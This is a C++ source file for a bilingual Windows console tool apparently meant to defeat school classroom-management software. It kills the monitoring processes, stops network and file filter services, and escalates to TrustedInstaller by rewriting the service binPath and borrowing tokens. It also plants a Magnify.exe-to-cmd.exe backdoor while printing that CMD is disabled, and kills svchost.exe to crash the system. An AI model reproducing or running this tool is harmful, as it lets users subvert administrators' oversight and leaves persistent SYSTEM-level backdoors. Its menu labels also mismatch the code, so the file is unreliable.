#include<stdio.h>
#include<iostream>
#include<windows.h>
#include<shellapi.h>
#include<wow64apiset.h>
//#include<sm.cpp>
#define scanf_s scanf
//#define printf_s printf

using namespace std;

int choose;
char pn;
bool adm;

bool IsAdm() {
    BOOL f = FALSE;
    PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY n = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&n, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &g)) {
        CheckTokenMembership(NULL, g, &f);
        FreeSid(g);
    }
    return f;
}

void Elev() {
    WCHAR p[MAX_PATH];
    GetModuleFileNameW(NULL, p, MAX_PATH);
    SHELLEXECUTEINFOW s = { sizeof(s) };
    s.lpVerb = L"runas";
    s.lpFile = p;
    s.nShow = SW_NORMAL;
    if (ShellExecuteExW(&s)) {
        exit(0);
    }
}

static void t() {
    system("cls");
    printf("/**===============================================================**\\\n");
    printf("Tools V 0.0.1\n");
    choose = 0;
    return;
}

static void KillMthKeyboradControler() {

    return;
}

//KeyBorad
HHOOK kbdHook;
static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return FALSE;
}
static DWORD WINAPI KeyHookThreadProc(LPVOID lpParameter) {
    while (true) {
        kbdHook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, GetModuleHandle(NULL), 0);
        Sleep(25);
        UnhookWindowsHookEx(kbdHook);
    }
    return 0;
}

static void OWnd() {
    HWND bdCst = FindWindow(NULL, L"屏幕广播");
    PostMessage(bdCst, WM_COMMAND, WPARAM((BM_CLICK << 16) | 1004), NULL);
}

namespace ineed {
    int choose;
    static void truster() {
        t();
        printf("------------Sudo Menu V0.1 Operating System Choose------------\n(1) Over Windows 10 (Need Powershell V5.0)\n(2) Windows 8.1 - Windows Vista\n");
        scanf_s("%d", &choose);

        if (choose == 1) {
            t();
            printf("------------Sudo Menu V0.1 Download Modules------------\n(1) 已下载模块 Have download modules.\n(2) 从未下载模块 Don't download modules before.\n");
            scanf_s("%d", &choose);

            if (choose == 2) {
                printf("下载目录 PWD:C:\\token\n");
                system("创建token文件夹 mkdir C:\\token 2>nul");
                printf("下载模块 Downloading modules");
                system("powershell -Command \"& {"
                    "Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned; "
                    "Save-Module -Name NtObjectManager -Path C:\\token; "
                    "Install-Module -Name NtObjectManager -Force; "
                    "Import-Module NtObjectManager}\"");
            }
            printf("启动窗口 Running...\n");
            system("powershell -Command \"& {"
                "Start-Service TrustedInstaller; "
                "Set-NtTokenPrivilege SeDebugPrivilege; "
                "$p = Get-NtProcess -Name TrustedInstaller.exe; "
                "New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p}\"");
        }
        else if (choose == 1) {
            system("sc stop TrustedInstaller & "
                "sc config TrustedInstaller binPath= \"cmd /k start\" type= own & "
                "sc start TrustedInstaller & sc stop TrustedInstaller & "
                "sc config TrustedInstaller binPath= \"%%SystemRoot%%\\servicing\\TrustedInstaller.exe\" & "
                "sc start TrustedInstaller");
        }

        system("pause");
        return;
    }
    void sys() {
        system("takeown /f C:\\Windows\\System32\\Magnify.exe");
        system("icacls C:\\Windows\\System32\\Magnify.exe /grant %username%:F");
        system("ren C:\\Windows\\System32\\Magnify.exe Magnify.bak");
        system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe");
        printf("CMD.EXE disabled.\n");
    }
};

int main() {
    //ineed::truster();
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO b;
    GetConsoleScreenBufferInfo(h, &b);

    if (!IsAdm()) {
        pn = 'B';
        printf("检测到你没有以管理员身份运行此程序...\n务必以管理员模式运行程序，否则程序部分功能会失效\n(1)提升权限||(2)继续\n>");
        scanf_s("%d", &choose);
        if (choose == 1) {
            Elev();
        }
    }
    else {
        pn = 'A';
    }
    printf("%c\n", pn);
    //printf("Make sure run this program by Administrator, or some'll cannot work.确保程序以管理员身份运行，否则程序将会失效\n");
    //system("Pause");
    system("cls");

    while (true) {
        system("cls");
        printf("Loading");
        t();

        // 权限显示行
        if (pn == 'B') {
            SetConsoleTextAttribute(h, FOREGROUND_RED | FOREGROUND_INTENSITY);
        }
        printf("权限 Premisson: %c .A:Administrator,B:User\n", pn);
        SetConsoleTextAttribute(h, b.wAttributes);

        printf("(1) 关机 Shutdown\n");
        printf("(2) 解除控制 Kill Control-Process\n");
        printf("(3) 解除网络限制 Kill Net-control-Process\n");
        printf("(4) 运行命令行 Run terminal\n");
        printf("(5) 蓝瓶钙 BSOD\n");
        printf("(6) 解除文件限制 Stop File-Service\n");
        printf("(7) 特殊提权 sudo\n");
        printf("(8) 广播窗口化 Windows Boradcast\n");
        printf("(9) 解除键盘控制 Cover KeyBorad-LL\n");
        printf("(-1) 退出 Exit\n");
        printf("(-2) 重新加载 Reload\n");
        printf("/**===============================================================**\\\n");
        printf("Choose a value...\n");
        scanf_s("%d", &choose);

        if (choose == 1) {
            t();
            system("shutdown -s -t 0");
            printf("Stopped");
        }
        else if (choose == 2) {
            t();
            printf("必须在学生机上使用 Use this on the school which running Control-Process\n否则关闭这个程序 If not,close this terminal.\n");
            system("Pause");
            t();
            printf("执行中... Waiting...\n");
            system("taskkill /im studentmain.exe /f");
            printf("Stopped\n");
            system("Pause");
        }
        else if (choose == 3) {
            t();
            printf("有时候程序不会运行\"sc stop TdNetFilter\"，按下Windows + R 来运行它。\nSometimes this task won't run \"sc stop tdnetfilter\",pass \"Windows + R\" then type \"sc stop tdnetfilter\" to run again.\n");
            system("Pause & taskkill /im GATESRV.exe /f & Pause & taskkill /im MasterHelper.exe /f & sc stop TdnetFilter & echo Stopped & Pause &");
        }
        else if (choose == 4) {
            int chosen;
            t();
            printf(
                "终端列表 Terminal List...\n"
                "(1) Powershell.exe\n"
                "(2) Command.exe\n"
                "/**===============================================================**\\\n"
                "Choose a value...\n"
            );
            scanf_s("%d", &chosen);
            t();
            if (chosen == 1) {
                system("start powershell.exe");
                
            }
            else {
                system("start cmd.exe"); 
                system("help");
            }
            system("Pause");
        }
        else if (choose == 5) {
            t();
            printf("加载中 Loading...");
            system("taskkill /im svchost.exe /f");
            printf("Stopped");
            while (true) { t();}
        }
        else if (choose == 6) {
            t();
            printf("你确定吗？ Sure? Or stop this program.\n");
            system("pause & sc stop TdFileFilter & pause");
        }
        else if (choose == 7) {
            t();
            printf("------------Sudo Menu ------------\n (1) NT SERVICES / Trustedinstaller \n (2) SYSTEM\n(-1) TrustedInstaller服务损坏？ Trustedinstaller is broken???\nChoose a value...\n");
            scanf_s("%d", &choose);
            switch (choose) {
            case 1:
                ineed::truster(); break;
            case 2:
                ineed::sys(); break;
            case -1:
                system(
                    "sc config TrustedInstaller binPath = \"%SystemRoot%\\servicing\\TrustedInstaller.exe\" && sc config TrustedInstaller start = demand && sc sdset TrustedInstaller D : (A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)");
                system("Pause");
            default:
                printf("Unknwn value...\n"); system("Pause");
            }
        }
        else if (choose == 8) {
            puts("原理：加载WH_KEYBORAD_LL覆盖原钩子，达到解控目的");
            system("Pause");
            puts("加载中。。。 Loading...");
            CreateThread(NULL, 0, KeyHookThreadProc, NULL, 0, NULL);
            puts("Done");
            system("Pause");
        }
        else if (choose == 9) {
            puts("原理：模拟点击，向窗口发送消息。");
            puts("加载中。。。 Loading...");
            OWnd();
            puts("Done");
            system("Pause");
        }
        else if (choose == -1) {
            return 0;
        }
        else if (choose == -2) {
            system("cls");
            printf("Loading");
            t();
        }
        else {
            printf("Unknown value,please try again...\n");
            system("Pause");
        }
    }
    return 0;
}


